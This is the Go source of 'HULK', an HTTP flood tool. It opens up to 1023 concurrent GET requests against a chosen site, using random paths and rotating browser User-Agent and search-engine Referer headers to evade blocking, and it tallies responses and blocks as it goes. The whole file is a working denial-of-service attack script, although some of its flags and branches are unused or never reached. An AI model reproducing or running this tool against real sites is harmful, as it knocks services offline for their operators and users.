package main

import (
    "flag"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strings"
    "sync/atomic"
    "syscall"
)

type arrayFlags []string

func (i *arrayFlags) String() string {
    return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
    *i = append(*i, value)
    return nil
}

const __version__ = "1.0.1"
const (
    callGotOk uint8 = iota
    callExitOnErr
    callExitOnTooManyFiles
    callBlocked
    targetComplete
)

var (
    safe bool
    headersReferers = []string{
        "http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.bing.com/search?q=",
        "http://search.yahoo.com/search?p=",
    }
    headersUseragents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Android 14; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0",
    }
    cur int32
)

func main() {
    var (
        version bool
        site string
        headers arrayFlags
    )

    flag.BoolVar(&version, "version", false, "print version and exit")
    flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
    flag.StringVar(&site, "site", "http://localhost", "Destination site.")
    flag.Var(&headers, "header", "Add headers to the request.")
    flag.Parse()

    u, err := url.Parse(site)
    if err != nil {
        fmt.Println("Error parsing URL parameter")
        os.Exit(1)
    }

    if version {
        fmt.Println("Hulk", __version__)
        os.Exit(0)
    }

    go func() {
        fmt.Println("-- HULK Attack Started --\n        Go!\n")
        ss := make(chan uint8, 8)
        var errCount, sent, blocked int32

        fmt.Println("In use      |  Resp OK |  Got err  |  Blocked")
        for {
            if atomic.LoadInt32(&cur) < 1023 {
                go httpcall(site, u.Host, headers, ss)
            }
            if sent%10 == 0 {
                fmt.Printf("\r%6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
            }
            switch <-ss {
            case callExitOnErr:
                atomic.AddInt32(&cur, -1)
                errCount++
            case callExitOnTooManyFiles:
                atomic.AddInt32(&cur, -1)
            case callGotOk:
                sent++
            case callBlocked:
                blocked++
            case targetComplete:
                sent++
                fmt.Printf("\r%-6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
                fmt.Println("\r-- HULK Attack Finished --\n")
                os.Exit(0)
            }
        }
    }()

    ctlc := make(chan os.Signal)
    signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
    <-ctlc
    fmt.Println("\r\n-- Interrupted by user --\n")
}

func httpcall(url string, host string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)
    client := &http.Client{}
    randomPath := generateRandomPath(5)
    fullURL := url + "/" + randomPath

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        s <- callExitOnErr
        return
    }

    req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
    req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])

    resp, err := client.Do(req)
    if err != nil {
        s <- callExitOnErr
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode == 403 || resp.StatusCode == 429 {
        s <- callBlocked
        return
    }
    s <- callGotOk
}

func generateRandomPath(length int) string {
    letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    s := make([]rune, length)
    for i := range s {
        s[i] = letters[rand.Intn(len(letters))]
    }
    return string(s)
}
